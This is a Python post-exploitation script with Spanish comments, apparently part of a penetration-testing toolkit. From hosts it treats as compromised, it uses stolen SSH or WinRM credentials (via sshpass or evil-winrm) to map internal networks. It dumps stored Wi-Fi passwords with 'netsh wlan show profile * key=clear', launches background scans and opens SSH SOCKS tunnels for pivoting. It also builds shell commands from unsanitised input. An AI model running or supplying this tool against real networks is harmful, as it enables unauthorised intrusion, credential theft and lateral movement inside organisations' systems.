#!/usr/bin/env python3

import json
import subprocess
import ipaddress
import threading
import socket
import struct
import re
from concurrent.futures import ThreadPoolExecutor
import time
import os

class NetworkPivot:
    def __init__(self, config_file="config/pivot-config.json"):
        with open(config_file, 'r') as f:
            self.config = json.load(f)
        self.discovered_networks = []
        self.compromised_hosts = []
        self.pivot_routes = {}
        
    def discover_networks_from_host(self, host_ip, access_method="ssh", credentials=None):
        """Descubrir redes desde un host comprometido"""
        print(f"[+] Descubriendo redes desde {host_ip} via {access_method}")
        
        networks = {
            "interface_networks": [],
            "routing_table": [],
            "arp_table": [],
            "wireless_networks": [],
            "vpn_connections": [],
            "docker_networks": [],
            "virtual_networks": []
        }
        
        # Obtener información de interfaces de red
        if access_method == "ssh":
            networks = self.discover_via_ssh(host_ip, credentials, networks)
        elif access_method == "smb":
            networks = self.discover_via_smb(host_ip, credentials, networks)
        elif access_method == "winrm":
            networks = self.discover_via_winrm(host_ip, credentials, networks)
        
        # Analizar y procesar redes descubiertas
        self.process_discovered_networks(host_ip, networks)
        
        return networks
    
    def discover_via_ssh(self, host_ip, credentials, networks):
        """Descubrimiento de red via SSH (Linux/Unix)"""
        try:
            # Comandos para ejecutar remotamente
            commands = {
                "interfaces": "ip addr show 2>/dev/null || ifconfig -a 2>/dev/null",
                "routes": "ip route show 2>/dev/null || route -n 2>/dev/null",
                "arp": "ip neigh show 2>/dev/null || arp -a 2>/dev/null",
                "wireless": "iwconfig 2>/dev/null || iw dev 2>/dev/null",
                "vpn": "ps aux | grep -E '(openvpn|wireguard|ipsec)' | grep -v grep",
                "docker": "docker network ls 2>/dev/null || ip addr | grep docker",
                "netstat": "netstat -rn 2>/dev/null",
                "proc_net": "cat /proc/net/route 2>/dev/null",
                "wifi_networks": "nmcli dev wifi list 2>/dev/null || iwlist scan 2>/dev/null"
            }
            
            username = credentials.get("username", "root")
            password = credentials.get("password", "")
            key_file = credentials.get("key_file", None)
            
            for cmd_name, command in commands.items():
                try:
                    if key_file:
                        ssh_cmd = f"ssh -i {key_file} -o StrictHostKeyChecking=no {username}@{host_ip} '{command}'"
                    else:
                        ssh_cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{host_ip} '{command}'"
                    
                    result = subprocess.run(ssh_cmd, shell=True, capture_output=True, text=True, timeout=30)
                    
                    if result.returncode == 0 and result.stdout:
                        self.parse_network_output(cmd_name, result.stdout, networks)
                        
                except subprocess.TimeoutExpired:
                    print(f"[-] Timeout ejecutando {cmd_name} en {host_ip}")
                except Exception as e:
                    print(f"[-] Error ejecutando {cmd_name}: {e}")
                    
        except Exception as e:
            print(f"[-] Error en descubrimiento SSH: {e}")
            
        return networks
    
    def discover_via_winrm(self, host_ip, credentials, networks):
        """Descubrimiento de red via WinRM (Windows)"""
        try:
            # Comandos PowerShell para Windows
            ps_commands = {
                "interfaces": "Get-NetAdapter | fl",
                "ip_config": "ipconfig /all",
                "routes": "route print",
                "arp": "arp -a",
                "wifi": "netsh wlan show profiles",
                "wifi_details": "netsh wlan show profile * key=clear",
                "vpn": "Get-VpnConnection",
                "network_shares": "net view",
                "domain_controllers": "nltest /dclist:",
                "network_adapters": "wmic path win32_networkadapter get name,netconnectionid,netconnectionstatus"
            }
            
            username = credentials.get("username", "Administrator")
            password = credentials.get("password", "")
            domain = credentials.get("domain", ".")
            
            for cmd_name, command in ps_commands.items():
                try:
                    # Usando winrm-cli o evil-winrm
                    if os.path.exists("/usr/bin/evil-winrm"):
                        winrm_cmd = f"evil-winrm -i {host_ip} -u {username} -p '{password}' -e '{command}'"
                    else:
                        winrm_cmd = f"winrm -hostname {host_ip} -username {domain}\\{username} -password '{password}' '{command}'"
                    
                    result = subprocess.run(winrm_cmd, shell=True, capture_output=True, text=True, timeout=30)
                    
                    if result.returncode == 0 and result.stdout:
                        self.parse_windows_output(cmd_name, result.stdout, networks)
                        
                except subprocess.TimeoutExpired:
                    print(f"[-] Timeout ejecutando {cmd_name} en {host_ip}")
                except Exception as e:
                    print(f"[-] Error ejecutando {cmd_name}: {e}")
                    
        except Exception as e:
            print(f"[-] Error en descubrimiento WinRM: {e}")
            
        return networks
    
    def parse_network_output(self, cmd_name, output, networks):
        """Parsear salida de comandos Linux/Unix"""
        
        if cmd_name == "interfaces":
            # Parsear interfaces de red
            ip_pattern = r'inet (\d+\.\d+\.\d+\.\d+)/(\d+)'
            matches = re.findall(ip_pattern, output)
            for ip, prefix in matches:
                try:
                    network = ipaddress.IPv4Network(f"{ip}/{prefix}", strict=False)
                    networks["interface_networks"].append({
                        "network": str(network),
                        "ip": ip,
                        "prefix": prefix
                    })
                except:
                    pass
        
        elif cmd_name == "routes":
            # Parsear tabla de rutas
            route_lines = output.strip().split('\n')
            for line in route_lines:
                if 'default' in line or '0.0.0.0' in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        networks["routing_table"].append({
                            "destination": parts[0] if parts[0] != 'default' else '0.0.0.0/0',
                            "gateway": parts[1] if len(parts) > 1 else 'N/A',
                            "interface": parts[-1] if len(parts) > 2 else 'N/A'
                        })
        
        elif cmd_name == "arp":
            # Parsear tabla ARP
            ip_pattern = r'(\d+\.\d+\.\d+\.\d+)'
            ips = re.findall(ip_pattern, output)
            for ip in ips:
                networks["arp_table"].append(ip)
        
        elif cmd_name == "wireless" or cmd_name == "wifi_networks":
            # Parsear redes wireless
            ssid_pattern = r'ESSID:"([^"]+)"'
            ssids = re.findall(ssid_pattern, output)
            for ssid in ssids:
                if ssid not in [net.get("ssid") for net in networks["wireless_networks"]]:
                    networks["wireless_networks"].append({"ssid": ssid, "encryption": "Unknown"})
        
        elif cmd_name == "vpn":
            # Buscar conexiones VPN
            if output.strip():
                vpn_lines = [line for line in output.split('\n') if line.strip()]
                networks["vpn_connections"] = vpn_lines[:10]  # Limitar a 10
        
        elif cmd_name == "docker":
            # Redes Docker
            docker_pattern = r'(\d+\.\d+\.\d+\.\d+/\d+)'
            docker_nets = re.findall(docker_pattern, output)
            networks["docker_networks"] = docker_nets
    
    def parse_windows_output(self, cmd_name, output, networks):
        """Parsear salida de comandos Windows"""
        
        if cmd_name == "ip_config":
            # Parsear ipconfig
            ip_pattern = r'IPv4 Address.*?(\d+\.\d+\.\d+\.\d+)'
            subnet_pattern = r'Subnet Mask.*?(\d+\.\d+\.\d+\.\d+)'
            
            ips = re.findall(ip_pattern, output)
            subnets = re.findall(subnet_pattern, output)
            
            for ip, subnet in zip(ips, subnets):
                try:
                    # Convertir máscara a CIDR
                    cidr = sum([bin(int(x)).count('1') for x in subnet.split('.')])
                    network = ipaddress.IPv4Network(f"{ip}/{cidr}", strict=False)
                    networks["interface_networks"].append({
                        "network": str(network),
                        "ip": ip,
                        "subnet_mask": subnet
                    })
                except:
                    pass
        
        elif cmd_name == "routes":
            # Parsear route print
            route_lines = output.strip().split('\n')
            for line in route_lines:
                if '0.0.0.0' in line and 'default' not in line.lower():
                    parts = line.split()
                    if len(parts) >= 3:
                        networks["routing_table"].append({
                            "destination": parts[0],
                            "netmask": parts[1],
                            "gateway": parts[2],
                            "interface": parts[3] if len(parts) > 3 else 'N/A'
                        })
        
        elif cmd_name == "wifi" or cmd_name == "wifi_details":
            # Parsear perfiles WiFi
            profile_pattern = r'Profile\s*:\s*(.+)'
            profiles = re.findall(profile_pattern, output)
            for profile in profiles:
                networks["wireless_networks"].append({
                    "ssid": profile.strip(),
                    "stored_profile": True
                })
        
        elif cmd_name == "vpn":
            # Conexiones VPN
            if output.strip() and "No VPN connections" not in output:
                networks["vpn_connections"].append(output.strip()[:500])
    
    def process_discovered_networks(self, pivot_host, networks):
        """Procesar y validar redes descubiertas"""
        print(f"[+] Procesando redes descubiertas desde {pivot_host}")
        
        # Procesar redes de interfaces
        for net_info in networks["interface_networks"]:
            network_str = net_info["network"]
            
            # Verificar si es una red nueva
            if network_str not in [n["network"] for n in self.discovered_networks]:
                # Verificar si no es loopback o link-local
                try:
                    net = ipaddress.IPv4Network(network_str)
                    if not net.is_loopback and not net.is_link_local and not net.is_multicast:
                        self.discovered_networks.append({
                            "network": network_str,
                            "pivot_host": pivot_host,
                            "discovery_method": "interface",
                            "timestamp": time.time()
                        })
                        print(f"[+] Nueva red descubierta: {network_str} via {pivot_host}")
                except:
                    pass
        
        # Procesar IPs de ARP para descubrir hosts activos
        arp_networks = []
        for ip in networks["arp_table"]:
            try:
                ip_obj = ipaddress.IPv4Address(ip)
                if not ip_obj.is_loopback and not ip_obj.is_link_local:
                    # Inferir red desde IP (asumiendo /24)
                    network = ipaddress.IPv4Network(f"{ip}/24", strict=False)
                    net_str = str(network)
                    
                    if net_str not in [n["network"] for n in self.discovered_networks]:
                        arp_networks.append({
                            "network": net_str,
                            "pivot_host": pivot_host,
                            "discovery_method": "arp",
                            "active_host": ip,
                            "timestamp": time.time()
                        })
            except:
                pass
        
        self.discovered_networks.extend(arp_networks)
        
        # Programar escaneo de nuevas redes
        self.schedule_network_scans()
    
    def schedule_network_scans(self):
        """Programar escaneo de las nuevas redes descubiertas"""
        for network_info in self.discovered_networks:
            if not network_info.get("scanned", False):
                print(f"[+] Programando escaneo de {network_info['network']}")
                # Marcar como programado
                network_info["scanned"] = True
                
                # Aquí se llamaría al script de port-discovery.py
                # para escanear la nueva red
                self.scan_discovered_network(network_info)
    
    def scan_discovered_network(self, network_info):
        """Escanear una red recién descubierta"""
        try:
            network = network_info["network"]
            pivot_host = network_info["pivot_host"]
            
            print(f"[+] Escaneando red {network} via {pivot_host}")
            
            # Comando para escanear la red (usando el script existente)
            scan_cmd = f"python3 /opt/pentest/scripts/port-discovery.py {network} --pivot-host {pivot_host}"
            
            # Ejecutar en background
            subprocess.Popen(scan_cmd, shell=True)
            
        except Exception as e:
            print(f"[-] Error escaneando red {network_info['network']}: {e}")
    
    def establish_pivot_routes(self):
        """Establecer rutas de pivoting"""
        print("[+] Estableciendo rutas de pivoting...")
        
        for network_info in self.discovered_networks:
            pivot_host = network_info["pivot_host"]
            target_network = network_info["network"]
            
            # Configurar SOCKS proxy o túnel SSH
            if pivot_host not in self.pivot_routes:
                self.setup_pivot_tunnel(pivot_host, target_network)
    
    def setup_pivot_tunnel(self, pivot_host, target_network):
        """Configurar túnel de pivoting"""
        try:
            # Configurar túnel SSH SOCKS
            tunnel_port = 9050 + len(self.pivot_routes)
            
            ssh_tunnel_cmd = f"ssh -D {tunnel_port} -N -f root@{pivot_host}"
            subprocess.run(ssh_tunnel_cmd, shell=True)
            
            self.pivot_routes[pivot_host] = {
                "socks_port": tunnel_port,
                "target_networks": [target_network],
                "status": "active"
            }
            
            print(f"[+] Túnel SOCKS establecido: {pivot_host}:{tunnel_port}")
            
        except Exception as e:
            print(f"[-] Error estableciendo túnel: {e}")
    
    def save_pivot_results(self, output_file):
        """Guardar resultados de pivoting"""
        results = {
            "discovered_networks": self.discovered_networks,
            "pivot_routes": self.pivot_routes,
            "compromised_hosts": self.compromised_hosts,
            "timestamp": time.time()
        }
        
        with open(output_file, 'w') as f:
            json.dump(results, f, indent=2)
        
        print(f"[+] Resultados de pivoting guardados en {output_file}")

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 4:
        print("Uso: python3 network-pivot.py <host_ip> <access_method> <credentials_file>")
        print("Métodos: ssh, winrm, smb")
        sys.exit(1)
    
    host_ip = sys.argv[1]
    access_method = sys.argv[2]
    creds_file = sys.argv[3]
    
    with open(creds_file, 'r') as f:
        credentials = json.load(f)
    
    pivot = NetworkPivot()
    networks = pivot.discover_networks_from_host(host_ip, access_method, credentials)
    pivot.save_pivot_results(f"/opt/pentest/temp/pivot_{host_ip.replace('.', '_')}.json")
